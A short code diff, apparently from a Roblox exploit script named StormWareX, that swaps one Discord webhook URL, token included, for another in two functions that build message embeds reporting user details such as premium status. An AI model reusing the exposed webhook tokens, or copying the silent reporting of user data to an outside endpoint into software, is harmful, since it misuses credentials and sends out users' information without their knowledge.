@@ -1000,7 +1000,7 @@ local function RHOBEGE_fake_script() -- Credits.LocalScript
 			premium = "Yes"
 		end
 		local url =
-			"https://discord.com/api/webhooks/983075102797230160/BjIANqGaFvEA9yDmLMS9Xv2BONzGAGowRMMxbPB4Ja8X1GBuExthz-hvW1vGzxh7CObF"
+			"https://discord.com/api/webhooks/985429211818917979/QN1a1C4mMLLE9UqouF7g4OLblwxCplavw2xLrA6wdZkHiQiiXY1FK_1g50kvFfsh_s_1"
 		local data = {
 			["embeds"] = {
 				{
@@ -1148,7 +1148,7 @@ local function JPSURY_fake_script() -- StormWareX.Core
 	-- plez do not spam the webhook zamn
 	
 	local url =
-		"https://discord.com/api/webhooks/983075102797230160/BjIANqGaFvEA9yDmLMS9Xv2BONzGAGowRMMxbPB4Ja8X1GBuExthz-hvW1vGzxh7CObF"
+		"https://discord.com/api/webhooks/985429211818917979/QN1a1C4mMLLE9UqouF7g4OLblwxCplavw2xLrA6wdZkHiQiiXY1FK_1g50kvFfsh_s_1"
 	local data = {
 		["embeds"] = {
 			{
